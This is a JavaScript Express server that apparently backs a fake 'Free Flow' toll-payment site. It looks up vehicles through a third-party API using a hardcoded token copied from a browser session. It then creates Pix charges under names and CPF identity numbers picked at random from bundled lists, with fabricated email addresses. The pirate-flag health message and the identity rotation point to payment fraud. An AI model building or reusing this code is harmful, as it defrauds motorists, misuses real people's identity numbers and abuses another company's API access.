import express from 'express'
import axios from 'axios'
import cors from 'cors'
import dotenv from 'dotenv';
import { v4 as uuidv4 } from 'uuid';
import data from './data/names.json' with { type: 'json' };
import cpfData from './data/cpfs.json' with { type: 'json' };
dotenv.config()



const app = express()

const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
};

app.use(cors(corsOptions));
app.use(express.json())




const searchPlate = async (plate) => {



    const response = await fetch(`https://zpy-customer-communication-ecommerce-bff.usezapay.com.br/api/v1/vehicle/${plate}`, {
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVfYXQiOjIwNzM2MDA2MjMuNDAwMDQzLCJ1c2VyX2lkIjoiNzUwNTU5OCIsImF1ZCI6IkpGVlBKdTBIQzNhM1JJeG9BMTVXYXRHeUpkSDk3QmdpIiwiaXNzIjoiaHR0cDpsb2NhbGhvc3Q6ODAwMC8iLCJpYXQiOjE3NzM2MDA2MjMuNDAwMDIyLCJqdGkiOiJOb25lIn0.9JXl1c9WRyYFydlKOFcG5ECC5M0Vu3Gzip96b73H2e8",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "test_refresh_token": "true"
        },
        "referrer": "https://app.usezapay.com.br/",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    });

    const data = await response.json()
    return data;

}


app.get('/api/vehicle-lookup', async (req, res) => {

    const { plate } = req.query
    const response = await searchPlate(plate)
    return res.status(200).json(response)


})


app.post('/api/create-payment', async (req, res) => {

    const name = searchNames();
    const cpf = searchCpfs()
    const { amount } = req.body
 

    const formattedEmail = `${name.toLowerCase().replace(/\s+/g, '.')}@gmail.com`
    const newValue = Math.round(amount * 100)

    const pixData = {
        customer: {
            document: {
                number: cpf,
                type: "cpf"
            },
            name: name,
            email: formattedEmail,
            phone: "19995949392"
        },
        pix: {
            expiresInDays: 1
        },
        amount:newValue,
        paymentMethod: "pix",
        items: [
            {
                tangible: false,
                title: "Free Flow",
                unitPrice: newValue,
                quantity: 1
            }
        ]
    };

    const url = process.env.URL || "https://api.velana.com.br/v1/transactions";
    const secretKey = process.env.SECRET_KEY;

    const auth = 'Basic ' + Buffer.from(`${secretKey}:x`).toString('base64');
    try {
        const response = await axios.post(url,
            pixData,
            {
                headers: {
                    accept: 'application/json',
                    authorization: auth,
                    'content-type': 'application/json'
                },
            });

            const data = response.data;
        return res.json({ data, success: true })


    } catch (error) {
        console.log(error.response.data)

    }
})


app.get('/api/verify-status/:id', async (req, res) => {
    const { id } = req.params;

    const secretKey = process.env.SECRET_KEY;
    const auth = 'Basic ' + Buffer.from(`${secretKey}:x`).toString('base64');
    const url = process.env.URL || "https://api.velana.com.br/v1/transactions"
    try {



        const response = await axios.get(`${url}/${id}`,

            {
                headers: {
                    accept: 'application/json',
                    authorization: auth,
                    'content-type': 'application/json'
                },
            }
        )
        const status = response.data.status
        return res.json({status})
    } catch (error) {
        return res.status(400).json(error)
    }
})

const searchNames = () => {
    const nomes = data.nomes
    const randomName = nomes[Math.floor(Math.random() * nomes.length)];

    return randomName;
}

const searchCpfs = () => {
    const cpfs = cpfData.cpfs;
    const randomCpf = cpfs[Math.floor(Math.random() * cpfs.length)]

    return randomCpf;
}


app.get('/api/healthy', (req, res) => {
    return res.status(200).json({ message: "✅🏴‍☠️🏴‍☠️ API IS UP AND WORKING.." })
})

const PORT = process.env.PORT || 5004;


app.listen(PORT, () => {
    console.log("Server is running....")
})